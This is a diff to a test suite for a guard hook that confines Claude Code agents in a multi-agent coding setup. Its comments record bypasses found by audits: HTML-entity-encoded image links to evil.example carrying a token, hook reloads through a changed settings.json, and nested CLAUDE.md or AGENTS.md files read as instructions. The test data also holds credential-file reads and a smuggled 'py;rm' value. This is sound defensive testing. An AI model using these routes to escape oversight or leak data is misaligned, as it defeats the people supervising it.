@@ -1,7 +1,7 @@
 """The guard is the fence that holds at night. These tests pin what it blocks and what it lets through,
-including every bypass the four independent checks of 2026-11-07 found (audit rows 1-15, re-check N1-N12,
-re-check #3 findings 1-9, re-check #4 findings 1-11). V0.5: exact command forms, confined files, enforced switches,
-a locked PR ledger."""
+including every bypass the five independent checks of 2026-11-07 found (audit rows 1-15, re-check N1-N12,
+re-check #3 findings 1-9, re-check #4 findings 1-11, re-check #5 findings 1-7). V0.6: exact command forms, confined
+files, enforced and fresh switches, a locked PR ledger, plain posted text, the tower's checkout pinned to main."""
 import concurrent.futures
 import json
 import os
@@ -27,8 +27,9 @@ class StubEnv(guard.Env):
     and GitHub PRs the test controls."""
 
     def __init__(self, changed=(), files=None, redirects="", repo=REPO, prs_tonight=0, origin=None, mode="on",
-                 rung=1, prefix="tower/", open_rows=(), session_id=""):
-        super().__init__(project_dir="/repo", session_id=session_id)
+                 rung=1, prefix="tower/", open_rows=(), session_id="", agent_type="", fetch_age=5, settings=None):
+        super().__init__(project_dir="/repo", session_id=session_id, agent_type=agent_type)
+        self.fetch_age, self.settings = fetch_age, settings or {}
         self.changed, self.files, self.redirects, self._repo = list(changed), files or {}, redirects, repo
         self.prs_tonight, self.open_rows = prs_tonight, set(open_rows)
         self.origin = origin if origin is not None else f"https://github.com/{REPO}.git"
@@ -62,6 +63,12 @@ class StubEnv(guard.Env):
 
     def same_repo(self, path):
         return (os.path.normpath(path) + "/").startswith("/repo/")
+
+    def main_fetch_age(self, path):
+        return self.fetch_age
+
+    def blob(self, path, ref, rel):
+        return self.settings.get(ref, "settings-v1")
 
     def diff_names(self, where, src):
         return list(self.changed)
@@ -108,7 +115,7 @@ WORKFLOW = (
     "git ls-remote --heads origin", "git ls-remote --heads origin tower/e1", "git switch --no-track -c tower/e1 origin/main",
     "python3 -I checks/e1_slugify.py", "python3 -I -m pytest -q", "git add -A", "git add src/textkit/slug.py tests/test_slug.py",
     "git diff --cached --stat origin/main", "git commit -m 'E1: slugify(text) turns text into a URL slug'",
-    "git push -u origin HEAD:refs/heads/tower/e1", PR, "git switch --detach origin/tower/e1",
+    "git push -u origin HEAD:refs/heads/tower/e1", PR,
     "git push origin HEAD:refs/heads/tower/e1", "git fetch --unshallow origin", "git rev-parse --is-shallow-repository",
     "git fetch origin refs/heads/tower/e1:refs/remotes/origin/tower/e1", "git rev-parse origin/tower/e1",
     # checker
@@ -126,6 +133,18 @@ WORKFLOW = (
 @pytest.mark.parametrize("cmd", WORKFLOW)
 def test_prescribed_commands_pass(cmd):
     assert bash(cmd), cmd
+
+
+def test_workers_and_checkers_switch_to_row_branches_in_their_worktrees_only():
+    # re-check #5 #4: Claude Code reloads hooks when .claude/settings.json changes; the tower's checkout stays on main
+    switch = {"command": "git switch --detach origin/tower/e1"}
+    assert wok("Bash", switch)
+    assert ok("Bash", {"command": "git switch --detach origin/main"})
+    assert not ok("Bash", switch)                                              # the tower's own checkout
+    old = StubEnv(settings={"refs/remotes/origin/tower/e1": ""})              # a branch made before the template
+    assert not wok("Bash", switch, old)
+    drift = StubEnv(settings={"refs/remotes/origin/tower/e1": "settings-v0"})  # an older settings file
+    assert not wok("Bash", switch, drift)
 
 
 def test_workers_write_code_tests_readme_in_their_worktree_and_the_tower_writes_scratch_files():
@@ -158,7 +177,7 @@ def test_writes_elsewhere_are_refused():
 def test_nested_agent_instructions_are_never_written():
     # re-check #4 #5: Claude Code loads nested CLAUDE.md files as instructions
     for rel in ("src/CLAUDE.md", "tests/CLAUDE.md", "src/textkit/CLAUDE.local.md", "src/.claude/settings.json",
-                "tests/.claude/agents/x.md", "tests/.mcp.json", "src/claude.md"):
+                "tests/.claude/agents/x.md", "tests/.mcp.json", "src/claude.md", "src/AGENTS.md", "tests/agents.md"):
         assert not wok("Write", {"file_path": f"{W}/{rel}"}), rel
 
 
@@ -209,6 +228,51 @@ def test_secrets_are_never_read_searched_or_printed():
     assert ok("Glob", {"pattern": "src/**/*.py"})
 
 
+def test_posted_text_has_no_images_entities_or_outside_links():
+    # re-check #5 #1: &#104;ttps hid the scheme from the link rule; Markdown decodes it into an image link
+    for text in ("![s](&#104;ttps://evil.example/s.png?t=abc)", '<img src="&#x68;ttps://evil.example/p">',
+                 "[r]: &#104;ttps://evil.example/x", "see &colon; and &amp;", "![s](https://github.com/" + REPO + "/x.png)",
+                 '<picture><source srcset="x"></picture>', "<video>", "a src=x"):
+        note = StubEnv(files={"E1-note.md": "<!-- code-tower -->\n" + text})
+        assert not bash(f"gh api repos/{REPO}/issues/3/comments -X POST -F body=@runs/ct/E1-note.md", note), text
+        assert not bash(PR, StubEnv(files={"E1-body.md": "## What changed\n" + text})), text
+        entry = {"parent": {"data_source_id": guard.COORD_DS}, "pages": [{"content": text}]}
+        assert not ok("mcp__Notion__notion-create-pages", entry), text
+    for page in ({"properties": {"Entry": "x"}, "cover": "notion://x"}, {"properties": {"Entry": "x"}, "icon": "🗼"}):
+        assert not ok("mcp__Notion__notion-create-pages", {"parent": {"data_source_id": guard.COORD_DS}, "pages": [page]})
+    assert not bash("git commit -m 'see https://evil.example/x'")
+    assert not bash(PR.replace("title='E1: slugify(text) turns text into a URL slug'", "title='https://evil.example/x'"))
+    assert bash(f"git commit -m 'E1: see https://github.com/{REPO}/pull/3'")
+
+
+def test_outward_actions_need_main_fetched_in_the_last_ten_minutes():
+    # re-check #5 #3: Adam's off switch on GitHub reached the run only once the run itself fetched
+    for age in (None, 601, 86400):
+        stale = StubEnv(files=CLEAN, fetch_age=age)
+        for cmd in ("git push -u origin HEAD:refs/heads/tower/e1", PR,
+                    f"gh api repos/{REPO}/issues/3/comments -X POST -F body=@runs/ct/E1-note.md"):
+            assert not bash(cmd, stale), (age, cmd)
+        assert not ok("Agent", {"subagent_type": "worker", "isolation": "worktree", "prompt": "x"}, stale)
+        for cmd in ("git fetch origin", "git commit -m 'E1: x'", "python3 -I -m pytest -q"):
+            assert bash(cmd, stale), (age, cmd)                                  # local work and the fetch itself
+    assert bash("git push -u origin HEAD:refs/heads/tower/e1", StubEnv(fetch_age=599))
+
+
+def test_a_checker_only_reads():
+    # re-check #5 nit 7f: the guard couldn't tell a checker from a worker; the hook input names the agent type
+    checker = StubEnv(files=CLEAN, agent_type="checker")
+    for cmd in ("git commit -m 'E1: x'", "git add -A", "git push origin HEAD:refs/heads/tower/e1", PR,
+                "git switch --no-track -c tower/e1 origin/main",
+                f"gh api repos/{REPO}/issues/3/comments -X POST -F body=@runs/ct/E1-note.md"):
+        assert not ok("Bash", {"command": cmd}, checker, cwd=W), cmd
+    assert not ok("Write", {"file_path": f"{W}/src/x.py"}, checker, cwd=W)
+    assert not ok("Agent", {"subagent_type": "worker", "isolation": "worktree", "prompt": "x"}, checker)
+    for cmd in ("git fetch origin refs/heads/tower/e1:refs/remotes/origin/tower/e1", "git switch --detach origin/tower/e1",
+                "python3 -I checks/e1_slugify.py", "python3 -I -m pytest -q", "git diff --stat origin/main...HEAD"):
+        assert ok("Bash", {"command": cmd}, checker, cwd=W), cmd
+    assert ok("Grep", {"pattern": "import", "path": f"{W}/src"}, checker, cwd=W)
+
+
 def test_reads_stay_inside_this_repo():
     # Cloud containers keep tokens outside the repo (a /tmp MCP config with a bearer token, an env-manager log,
     # /etc/shadow, mounted folders). The tower reads only its checkout, its worktrees and its own saved tool results.
@@ -217,10 +281,13 @@ def test_reads_stay_inside_this_repo():
                  "/tmp/claude-tool-results/../codesign-mcp-config.json"):
         assert not ok("Read", {"file_path": path}), path
     assert ok("Read", {"file_path": "/repo/.claude/worktrees/agent-e1/src/textkit/slug.py"})
-    mine = StubEnv(session_id="35e38ca0-d2a0-5d97")
-    assert ok("Read", {"file_path": "/tmp/claude-tool-results/35e38ca0-d2a0-5d97/toolu_1.json"}, mine)
+    mine = StubEnv(session_id="c1b82419-aaaa-bbbb")
+    own = f"{os.path.realpath(HOME)}/.claude/projects/-home-claude/c1b82419-aaaa-bbbb/tool-results/b1.txt"
+    assert ok("Read", {"file_path": own}, mine)                                 # Claude Code's own saved output
+    assert ok("Read", {"file_path": "/tmp/claude-tool-results/c1b82419-aaaa-bbbb/toolu_1.json"}, mine)
+    assert not ok("Read", {"file_path": own.replace("c1b82419-aaaa-bbbb", "another-session-1")}, mine)
     assert not ok("Read", {"file_path": "/tmp/claude-tool-results/other-session-1/toolu_1.json"}, mine)
-    assert not ok("Read", {"file_path": "/tmp/claude-tool-results/35e38ca0-d2a0-5d97/toolu_1.json"})
+    assert not ok("Read", {"file_path": own})                                   # no session id: no exception
 
 
 def test_grep_globs_pick_files_by_extension_only():
@@ -228,9 +295,15 @@ def test_grep_globs_pick_files_by_extension_only():
     for glob in (".en[v]", "*env", "{.git,config}", "{.git,.git/**}", "*", "**", ".git/config", "*.env", "?env",
                  "!src", ".claude/**", "**/.credentials.*"):
         assert not ok("Grep", {"pattern": "x", "path": "/repo", "glob": glob}), glob
-    for glob in ("*.py", "src/**/*.md", "test_*.py", "**/*.json", "tests/*.txt"):
-        assert ok("Grep", {"pattern": "x", "path": "/repo", "glob": glob}), glob
-    assert not ok("Grep", {"pattern": "x", "type": "py;rm"})
+    for glob in ("*.py", "**/*.md", "test_*.py", "**/*.json", "data/*.txt"):
+        assert ok("Grep", {"pattern": "x", "path": "/repo/src", "glob": glob}), glob
+    assert not ok("Grep", {"pattern": "x", "path": "/repo/src", "type": "py;rm"})
+    # re-check #5 nit 7a: from the checkout root, *.json reached git-ignored files such as settings.local.json
+    for path in ("/repo", "/repo/.claude", "/repo/docs"):
+        assert not ok("Grep", {"pattern": "x", "path": path, "glob": "*.json"}), path
+    assert not ok("Grep", {"pattern": "x"})                                      # no path: the root
+    for path in ("/repo/tests", "/repo/checks", "/repo/tower", "/repo/rules", "/repo/runs/ct", "/repo/PLAN.md"):
+        assert ok("Grep", {"pattern": "x", "path": path}), path
 
 
 def test_a_body_with_a_secret_or_a_comment_without_the_marker_is_not_posted():
@@ -433,7 +506,8 @@ def test_agents_are_workers_or_checkers_in_their_own_worktree():
     for tool in ("SendMessage", "ToolSearch", "TodoWrite", "TaskCreate"):
         assert ok(tool, {}), tool
     assert ok("Skill", {"skill": "code-tower"})
-    assert not ok("Skill", {"skill": "anthropic-skills:pr-merge-check"})
+    for name in ("anthropic-skills:pr-merge-check", "anything:code-tower", "code-tower-2"):
+        assert not ok("Skill", {"skill": name}), name
 
 
 # --- tools, MCP and web --------------------------------------------------------------------------------
@@ -499,6 +573,8 @@ def real_repo(tmp_path):
     (work / "rules").mkdir()
     (work / "rules" / "project.json").write_text(json.dumps(RULES))
     (work / "PLAN.md").write_text(PLAN)
+    (work / ".claude").mkdir()
+    (work / ".claude" / "settings.json").write_text('{"permissions": {}}\n')
     _git("add", "-A", cwd=work)
     _git("commit", "-q", "-m", "init", cwd=work)
     _git("push", "-q", "origin", "HEAD:main", cwd=work)
@@ -626,11 +702,24 @@ def test_real_repo_shallow_single_branch_clone_can_fetch_row_branches(real_repo,
          cwd=tmp_path)
     cenv = guard.Env(project_dir=str(clone))
     for cmd in ("git rev-parse --is-shallow-repository", "git fetch --unshallow origin",
-                "git fetch origin refs/heads/tower/e1:refs/remotes/origin/tower/e1",
-                "git switch --detach origin/tower/e1", "git diff --stat origin/main...HEAD"):
+                "git fetch origin refs/heads/tower/e1:refs/remotes/origin/tower/e1"):
         assert guard.decide("Bash", {"command": cmd}, str(clone), cenv)[0], cmd
         subprocess.run(cmd.split(), cwd=clone, check=True, capture_output=True)
     assert _git("rev-parse", "--is-shallow-repository", cwd=clone).strip() == "false"
+    switch = "git switch --detach origin/tower/e1"
+    assert not guard.decide("Bash", {"command": switch}, str(clone), cenv)[0]      # the tower's own checkout
+    wt = clone / ".claude" / "worktrees" / "w1"
+    _git("worktree", "add", "-q", "--detach", str(wt), "origin/main", cwd=clone)
+    for cmd in (switch, "git diff --stat origin/main...HEAD"):
+        assert guard.decide("Bash", {"command": cmd}, str(wt), cenv)[0], cmd
+        subprocess.run(cmd.split(), cwd=wt, check=True, capture_output=True)
+    # re-check #5 #4: a row branch whose settings differ from main's would load its own hooks on switch
+    (work / ".claude" / "settings.json").write_text('{"hooks": {}}\n')
+    _git("add", "-A", cwd=work)
+    _git("commit", "-q", "-m", "other settings", cwd=work)
+    _git("push", "-q", remote, "HEAD:refs/heads/tower/e2", cwd=work)
+    _git("fetch", "-q", "origin", "refs/heads/tower/e2:refs/remotes/origin/tower/e2", cwd=clone)
+    assert not guard.decide("Bash", {"command": "git switch --detach origin/tower/e2"}, str(wt), cenv)[0]
 
 
 def _hook_command():
